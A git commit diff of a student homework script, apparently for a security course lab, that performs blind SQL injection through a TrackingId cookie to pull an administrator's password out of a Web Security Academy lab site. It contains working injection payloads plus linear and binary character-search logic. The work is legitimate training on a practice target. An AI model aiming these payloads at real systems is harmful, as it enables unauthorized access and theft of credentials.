ce66899036f414ab9b1021180514e694fad103d3
Maksim Semchuk <semchuk2@pdx.edu>
2021-04-25 20:13:29 -0700

    sort of works, the program crashes when it goes for another loop for next character

--- Lab Notebook #2 and HW2/hw2/hw2.py
+++ Lab Notebook #2 and HW2/hw2/hw2.py
@@ -10,7 +10,6 @@ import time
 import string
 
 # Functions:
-
 # Step 4: Inital Program:
 def try_query(query):
     print(f'Query: {query}')
@@ -22,13 +21,14 @@ def try_query(query):
     else:
         return False
 
+
 # This takes in a url (to the site),
 # A prefix, that is already know, if any.
 # a letter that is being tested to see if it exists inside of the password.
 def test_string(url, prefix, letter):
     #query is what is going to be passed in as a regex argument along with the cookie.,
-    query = f"x' union select 'a' from users where username = 'administrator' and password ~ '^{prefix}{letter}'--"
-    print(f'\nTesting: ^{prefix}{letter}')
+    query = f"x' union select 'a' from users where username = 'administrator' and password ~ '{prefix}{letter}'--"  #removed the ^ from the ^{prefix} , since prefix has that already
+    print(f'\nTesting: {prefix}{letter}')
     mycookies = {'TrackingId': urllib.parse.quote_plus(query)}
 
     # Now to test it:
@@ -41,22 +41,84 @@ def test_string(url, prefix, letter):
     else:
         return False
 
-# Step 6: Find the password Length:
-def find_password_length():
-    # Step 6: Find the password Length:
-    begin_time = time.perf_counter()
-    num = 1
-    while True:
-        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
-        print(f'Trying length {num}')
-        if try_query(query) == False:
-            num = num + 1
-        else:
-            break
-    print(f"Password length is {num}")
-    print(f"Time elapsed is {time.perf_counter()-begin_time}")
-    return num
 
+def recursive_search(url, administrator_prefix, charset, mid):
+    if (len(charset[:mid])!=1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[:mid]}]' --""")):
+        administrator_prefix += recursive_search(url, administrator_prefix, charset[:mid], len(charset[:mid])//2)
+    elif (len(charset[:mid])!=1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[mid:]}]' --""")):
+        administrator_prefix += recursive_search(url, administrator_prefix, charset[mid:], len(charset[mid:])//2)
+    
+    if (len(charset[:mid])==1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[:mid]}]' --""")):
+        administrator_prefix += charset[:mid]
+        print(f"administrator_prefix: {administrator_prefix}")
+        return administrator_prefix
+    if (len(charset[mid:])==1) and (try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^{administrator_prefix}[{charset[mid:]}]' --""")):
+        administrator_prefix += charset[mid:]
+        print(f"administrator_prefix: {administrator_prefix}")
+        return administrator_prefix
+
+
+def binary_search(url):
+    administrator_prefix = ''
+    charset = string.ascii_lowercase + string.digits
+    mid = len(charset) // 2
+    print(try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^[{charset[:mid]}]' --"""))
+    print(try_query(f"""x' UNION SELECT username from users where username = 'administrator' and password ~ '^[{charset[mid:]}]' --"""))
+    while True:
+        administrator_prefix += recursive_search(url, administrator_prefix, charset, mid)
+        if test_string(url, administrator_prefix, '$'):
+            return administrator_prefix
+
+
+
+
+
+
+
+# To clean things up
+if __name__ == "__main__":
+    #site = sys.argv[1]
+    site = 'https://ac4d1f6f1f26c6de806067290069006b.web-security-academy.net/'
+    if 'https://' in site:
+        site = site.rstrip('/').lstrip('https://')
+
+    url = f'https://{site}/'
+
+    # Step #11: Binary Search:
+    admin_password = binary_search(url)
+    print(f"Final password is: {admin_password}\n")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Step #6: Password Length:
+# password_length = find_password_length()
+
+# Step #8: Linear Password search:
+# reference_password = linear_search()
+# print(f"Password reference password is {reference_password}")
+
+"""
 # Step 8: Linear Search:
 def linear_search():
     start_alpha = string.ascii_lowercase + string.digits
@@ -74,45 +136,23 @@ def linear_search():
                 break
     print(f"Time elapsed is {time.perf_counter()-begin_time}")
     return prefix
+"""
 
-def recursive_binary_search(substring, middle_seperator_of_valid_character_set, administrator_password):
-    print(f"Substring: {substring}")
-    print(f"Middle Seperator: {middle_seperator_of_valid_character_set}")
-    print(f"administrator_password: {administrator_password}")
-    return True
-    
+"""
+# Step 6: Find the password Length:
+def find_password_length():
+    # Step 6: Find the password Length:
+    begin_time = time.perf_counter()
+    num = 1
+    while True:
+        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
+        print(f'Trying length {num}')
+        if try_query(query) == False:
+            num = num + 1
+        else:
+            break
+    print(f"Password length is {num}")
+    print(f"Time elapsed is {time.perf_counter()-begin_time}")
+    return num
 
-
-def binary_search(url):
-    valid_character_set = string.ascii_lowercase + string.digits
-    print(valid_character_set)
-    administrator_password = ''
-    incomplete_password = True  # Flag, to keep the program going until a whole password is found, which is set by finding a exact match
-    middle_seperator_of_valid_character_set = len(valid_character_set) // 2
-
-    query_left = f"x' union select 'a' from users where username = 'administrator' and password ~ '^[{valid_character_set[:middle_seperator_of_valid_character_set]}]'--"
-    query_right = f"x' union select 'a' from users where username = 'administrator' and password ~ '^[{valid_character_set[middle_seperator_of_valid_character_set:]}]'--"
-    if try_query(query_left):
-        administrator_password = recursive_binary_search(valid_character_set[:middle_seperator_of_valid_character_set], len(valid_character_set[:middle_seperator_of_valid_character_set]), administrator_password)
-    elif try_query(query_right):
-        administrator_password = recursive_binary_search(valid_character_set[middle_seperator_of_valid_character_set:], len(valid_character_set[:middle_seperator_of_valid_character_set:]), administrator_password)
-    else:
-        print("Error occured, no substring is correct")
-
-# To clean things up
-if __name__ == "__main__":
-    site = sys.argv[1]
-    if 'https://' in site:
-        site = site.rstrip('/').lstrip('https://')
-
-    url = f'https://{site}/'
-
-    # Step #6: Password Length:
-    # password_length = find_password_length()
-
-    # Step #8: Linear Password search:
-    # reference_password = linear_search()
-    # print(f"Password reference password is {reference_password}")
-
-    # Step #11: Binary Search:
-    binary_search(url)
+"""
